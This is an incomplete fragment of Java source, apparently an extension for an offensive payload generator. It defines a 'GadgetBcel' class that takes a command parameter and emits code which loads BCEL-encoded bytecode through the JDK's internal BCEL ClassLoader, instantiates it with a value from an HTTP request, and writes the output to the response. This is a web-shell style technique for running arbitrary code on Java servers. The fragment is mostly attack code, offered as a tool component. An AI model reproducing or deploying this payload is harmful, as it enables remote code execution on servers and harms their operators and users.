...
@Extension
public class GadgetBcel implements GadgetExtension {
  @Override
  public List<String> getImports(ExtensionContext ctx) {
    return List.of("com.sun.org.apache.bcel.internal.util.*");
  }
  ...
  public List<String> getCode(ExtensionContext ctx) {
    ...
    if (cmd == null || cmd.isEmpty()) {
      throw new ExtensionException("No cmd parameter specified");
    }
...
response.getOutputStream().write(String.valueOf(new ClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter("%s")).toString()).getBytes());
""",
            cmd));
  }
